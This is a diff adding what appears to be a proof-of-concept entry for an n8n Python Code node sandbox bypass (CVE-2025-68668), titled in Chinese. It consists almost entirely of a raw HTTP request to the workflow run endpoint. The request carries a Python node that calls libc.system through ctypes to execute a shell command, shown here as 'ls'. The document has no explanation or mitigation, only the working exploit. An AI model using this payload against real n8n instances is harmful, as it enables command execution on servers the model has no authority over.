@@ -1,0 +1,21 @@
+# n8n Python代码节点沙箱绕过导致系统命令执行漏洞(CVE-2025-68668)
+POST /rest/workflows/D091Xjtma6I0gLtp/run?partialExecutionVersion=2 HTTP/1.1
+Accept: application/json, text/plain, */*
+Accept-Encoding: gzip, deflate, br, zstd
+Accept-Language: en
+Connection: keep-alive
+Content-Length: 1672
+Content-Type: application/json
+Host: localhost:5678
+Origin: http://localhost:5678
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
+browser-id: e1d1feee-29c8-4d89-bde7-e88ad562ad11
+push-ref: srkea3okwb
+sec-ch-ua: "Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"
+sec-ch-ua-mobile: ?0
+sec-ch-ua-platform: "macOS"
+
+{"workflowData":{"name":"My workflow","nodes":[{"parameters":{},"type":"n8n-nodes-base.manualTrigger","typeVersion":1,"position":[0,0],"id":"049cb7b4-0d4c-433e-bc38-992d82c9f63f","name":"When clicking ‘Execute workflow’"},{"parameters":{"language":"python","pythonCode":"import ctypes\nlibc = ctypes.CDLL(None) \nlibc.system(b'ls')\n\nreturn {\"a\":\"b\"}"},"type":"n8n-nodes-base.code","typeVersion":2,"position":[208,0],"id":"27d00d3a-09bb-4f40-80ec-e8caf74f6a2e","name":"Code in Python (Beta)"}],"pinData":{},"connections":{"When clicking ‘Execute workflow’":{"main":[[{"node":"Code in Python (Beta)","type":"main","index":0}]]}},"active":false,"settings":{"executionOrder":"v1"},"tags":[],"versionId":"373424c5-ad07-4b87-a2b7-331ac9bc284c","id":"D091Xjtma6I0gLtp"},"runData":{"When clicking ‘Execute workflow’":[{"startTime":1767575154380,"executionIndex":0,"source":[],"hints":[],"executionTime":26,"executionStatus":"success","data":{"main":[[{"json":{},"pairedItem":{"item":0}}]]}}],"Code in Python (Beta)":[{"startTime":1767575255483,"executionIndex":1,"source":[{"previousNode":"When clicking ‘Execute workflow’","previousNodeOutput":0,"previousNodeRun":0}],"hints":[{"message":"To make sure expressions after this node work, return the input items that produced each output item. <a target=\"_blank\" href=\"https://docs.n8n.io/data/data-mapping/data-item-linking/item-linking-code-node/\">More info</a>","location":"outputPane"}],"executionTime":109,"executionStatus":"success","data":{"main":[[{"json":{"a":"b"},"pairedItem":{"item":0}}]]}}]},"startNodes":[],"destinationNode":"Code in Python (Beta)","dirtyNodeNames":["Code in Python (Beta)"]}
